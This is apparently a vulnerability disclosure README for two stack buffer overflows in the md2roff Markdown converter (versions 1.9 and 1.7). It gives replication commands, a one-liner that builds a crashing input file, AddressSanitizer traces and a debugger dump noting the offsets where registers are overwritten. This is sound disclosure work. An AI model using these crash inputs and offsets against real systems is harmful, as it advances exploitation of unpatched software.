# CVE-2022-41220

md2roff 1.9 suffers from a stack-based buffer overflow via a Markdown file containing a large number of consecutive characters to be processed. 

NOTE: For an in-depth walkthrough on this vulnerability, read [this article](https://halcyonic.net/zero-day-research-cve-2022-41220-md2roff-version-1-9-buffer-overflow/) on our offical site.

## Replication

To replicate the vulnerability, download a vulnerable version of md2roff (version 1.9):

```
git clone https://github.com/nereusx/md2roff.git
cd md2roff
git checkout 9241b8cfeb687c57099f3ef45f03a8ad3f291cf4
make
```

Once the project is compiled, we can process a malicious markdown file produced by our fuzz tests to replicate a program crash:

```
./md2roff poc.md
```

Executing the previous command will produce a segfault:

```
segmentation fault  ./md2roff poc.md
```

Compiling the project with address sanitizer (ASAN) confirms our stack buffer overflow:

```
#
#       GNU make
#

prefix  ?= /usr/local
bindir  ?= $(prefix)/bin
mandir  ?= $(prefix)/share/man
man1dir ?= $(mandir)/man1

LIBS   = -lc
CFLAGS = -std=c99 -fsanitize=address

all: md2roff md2roff.1.gz

md2roff: md2roff.c
        $(CC) $(CFLAGS) md2roff.c -o md2roff $(LDFLAGS) $(LIBS)

md2roff.1.gz: md2roff.md md2roff
        ./md2roff --synopsis-style=1 md2roff.md > md2roff.1
        -groff md2roff.1 -Tpdf -man -P -e > md2roff.1.pdf
        ./md2roff -z --synopsis-style=1 md2roff.md > md2roff.1
        gzip -f md2roff.1

install: md2roff md2roff.1.gz
        mkdir -p -m 0755 $(DESTDIR)$(bindir) $(DESTDIR)$(man1dir)
        install -m 0755 -s md2roff $(DESTDIR)$(bindir)
        install -m 0644 md2roff.1.gz $(DESTDIR)$(man1dir)

uninstall:
        rm -f $(DESTDIR)$(bindir)/md2roff $(DESTDIR)$(man1dir)/md2roff.1.gz

clean:
        rm -f *.o md2roff md2roff.1*

```

```
$ ./md2roff poc.md

=================================================================
==15685==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x7ffedb68e230 at pc 0x55ab4ac56d64 bp 0x7ffedb68e020 sp 0x7ffedb68e018
WRITE of size 1 at 0x7ffedb68e230 thread T0
    #0 0x55ab4ac56d63 in md2roff (/home/kali/projects/fuzzing/fuzz_targets/md2roff/md2roff+0x10d63)
    #1 0x55ab4ac598c0 in main (/home/kali/projects/fuzzing/fuzz_targets/md2roff/md2roff+0x138c0)
    #2 0x7f589f446189 in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58
    #3 0x7f589f446244 in __libc_start_main_impl ../csu/libc-start.c:381
    #4 0x55ab4ac4d3a0 in _start (/home/kali/projects/fuzzing/fuzz_targets/md2roff/md2roff+0x73a0)

Address 0x7ffedb68e230 is located in stack of thread T0 at offset 80 in frame
    #0 0x55ab4ac50d7e in md2roff (/home/kali/projects/fuzzing/fuzz_targets/md2roff/md2roff+0xad7e)

  This frame has 6 object(s):
    [32, 40) 'tt' (line 724)
    [64, 80) 'num' (line 1140) <== Memory access at offset 80 overflows this variable
    [96, 352) 'secname' (line 662)
    [416, 672) 'appname' (line 662)
    [736, 992) 'appsec' (line 662)
    [1056, 1312) 'appdate' (line 662)
HINT: this may be a false positive if your program uses some custom stack unwind mechanism, swapcontext or vfork
      (longjmp and C++ exceptions *are* supported)
SUMMARY: AddressSanitizer: stack-buffer-overflow (/home/kali/projects/fuzzing/fuzz_targets/md2roff/md2roff+0x10d63) in md2roff
Shadow bytes around the buggy address:
  0x10005b6c9bf0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x10005b6c9c00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x10005b6c9c10: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x10005b6c9c20: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x10005b6c9c30: 00 00 00 00 00 00 00 00 00 00 00 00 f1 f1 f1 f1
=>0x10005b6c9c40: f8 f2 f2 f2 00 00[f2]f2 00 00 00 00 00 00 00 00
  0x10005b6c9c50: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x10005b6c9c60: 00 00 00 00 00 00 00 00 f2 f2 f2 f2 f2 f2 f2 f2
  0x10005b6c9c70: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x10005b6c9c80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x10005b6c9c90: f2 f2 f2 f2 f2 f2 f2 f2 00 00 00 00 00 00 00 00
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
  Shadow gap:              cc
==15685==ABORTING

```

## Attaching GDB
If you run the program with gdb, you can see that the registers are being overwritten by our large buffer of characters:
```
pwndbg> r poc.md 
Starting program: /dev/shm/CVE-2022-41220/md2roff/md2roff poc.md
[Thread debugging using libthread_db enabled]                                                                                                                                   
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".                                                                                                      
.\# roff document                                                                       
.\# DO NOT MODIFY THIS FILE! It was generated by md2roff    
.do mso man.tmac                                                                        
.TH poc.md 7 2023-07-27 document                                                                                                                                                
Gl|||||n                                                                                
                                                                                        
Program received signal SIGSEGV, Segmentation fault.                           
0x0000555555556d0a in println ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA                                  
─────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────────────────────────────────────────────
*RAX  0x3277413177413077 ('w0Aw1Aw2')                                                   
 RBX  0x7fffffffddb8 ◂— 0x3072423971423871 ('q8Bq9Br0')
*RCX  0x0                                                                               
*RDX  0x0                                                                               
*RDI  0x3277413177413077 ('w0Aw1Aw2')                                                   
*RSI  0x2048532e                                                                        
 R8   0x7                                                                               
 R9   0x555555561200 ◂— 0x555555561                                                                                                                                             
*R10  0x7ffff7de10f8 ◂— 0x10001a00001033                                                
*R11  0x7ffff7f1ffe0 (__strchr_avx2) ◂— vmovd xmm0, esi       
 R12  0x0                                                                               
 R13  0x7fffffffddd0 ◂— 0x3872423772423672 ('r6Br7Br8')       
 R14  0x55555555edd8 (__do_global_dtors_aux_fini_array_entry) —▸ 0x555555556300 (__do_global_dtors_aux) ◂— endbr64 
 R15  0x7ffff7ffd020 (_rtld_global) —▸ 0x7ffff7ffe2e0 —▸ 0x555555554000 ◂— 0x10102464c457f     
*RBP  0x7fffffffd550 —▸ 0x7fffffffdb60 ◂— 0x3078413977413877 ('w8Aw9Ax0')
*RSP  0x7fffffffd530 —▸ 0x555555561cc0 ◂— 0x7c7c7c7c806c4708                      
*RIP  0x555555556d0a (println+73) ◂— movzx eax, byte ptr [rax]                                                                                                                  
──────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────────────────────────────────────────────────────
 ► 0x555555556d0a <println+73>    movzx  eax, byte ptr [rax]
    
```

At offset 342 the RAX register is overwritten, and at offset 661 the RDI register is overwritten.

## References
* https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-41220
* https://owasp.org/www-community/vulnerabilities/Buffer_Overflow


# CVE-2022-34913

md2roff 1.7 suffers from a stack-based buffer overflow via a Markdown file containing a large number of consecutive characters to be processed. 


## Replication

To replicate the vulnerability, we must download a vulnerable version of md2roff (version 1.7):

```
git clone https://github.com/nereusx/md2roff.git
cd md2roff
git checkout 7fc373d25c91422454f081c8a717222d77fd7add
make
```

Once the project is compiled, we can start by creating a malicious markdown file with a large buffer of ascii characters:

```
python3 -c 'print("1"*5000)' > poc.md
```

Now we can point md2roff to our malicious markdown file and invoke a crash:

```
./md2roff poc.md
```

Executing the previous command will produce a segfault:

```
segmentation fault  ./md2roff poc.md
```

To gain a better understanding of where the overflow is taking place, lets recompile the project with address sanitizer (ASAN) by adding *-fsanitize=address* to the CFLAGS variable in the Makefile.  We also want the compiler to store symbol table information in the executable (-g flag) to help us determine which line of code produced the crash:

```
CFLAGS = -std=c99 -fsanitize=address -g
```

Next we will clean any stale files and recompile the project:

```
make clean
make
```

The output from ASAN shows us that the vulnerable source code can be found in *md2roff.c, line 1095*:
```
==180298==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x7ffdddcce7e0 at pc 0x556b5ebc39da bp 0x7ffdddcce5e0 sp 0x7ffdddcce5d8
WRITE of size 1 at 0x7ffdddcce7e0 thread T0
    #0 0x556b5ebc39d9 in md2roff /dev/shm/md2roff/md2roff.c:1095
    #1 0x556b5ebc620f in main /dev/shm/md2roff/md2roff.c:1394
    #2 0x7f3576046189 in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58
    #3 0x7f3576046244 in __libc_start_main_impl ../csu/libc-start.c:381
    #4 0x556b5ebba3b0 in _start (/dev/shm/md2roff/md2roff+0x73b0)

Address 0x7ffdddcce7e0 is located in stack of thread T0 at offset 80 in frame
    #0 0x556b5ebbdb65 in md2roff /dev/shm/md2roff/md2roff.c:618

  This frame has 6 object(s):
    [32, 40) 'tt' (line 687)
    [64, 80) 'num' (line 1090) <== Memory access at offset 80 overflows this variable
    [96, 160) 'appname' (line 625)
    [192, 256) 'appsec' (line 625)
    [288, 352) 'appdate' (line 625)
    [384, 640) 'secname' (line 625)
HINT: this may be a false positive if your program uses some custom stack unwind mechanism, swapcontext or vfork
      (longjmp and C++ exceptions *are* supported)
SUMMARY: AddressSanitizer: stack-buffer-overflow /dev/shm/md2roff/md2roff.c:1095 in md2roff
Shadow bytes around the buggy address:
  0x10003bb91ca0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x10003bb91cb0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x10003bb91cc0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x10003bb91cd0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x10003bb91ce0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
=>0x10003bb91cf0: 00 00 f1 f1 f1 f1 f8 f2 f2 f2 00 00[f2]f2 00 00
  0x10003bb91d00: 00 00 00 00 00 00 f2 f2 f2 f2 00 00 00 00 00 00
  0x10003bb91d10: 00 00 f2 f2 f2 f2 00 00 00 00 00 00 00 00 f2 f2
  0x10003bb91d20: f2 f2 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x10003bb91d30: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x10003bb91d40: 00 00 f3 f3 f3 f3 f3 f3 f3 f3 00 00 00 00 00 00
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
  Shadow gap:              cc
==180298==ABORTING

```


## References
* https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-34913
* https://owasp.org/www-community/vulnerabilities/Buffer_Overflow
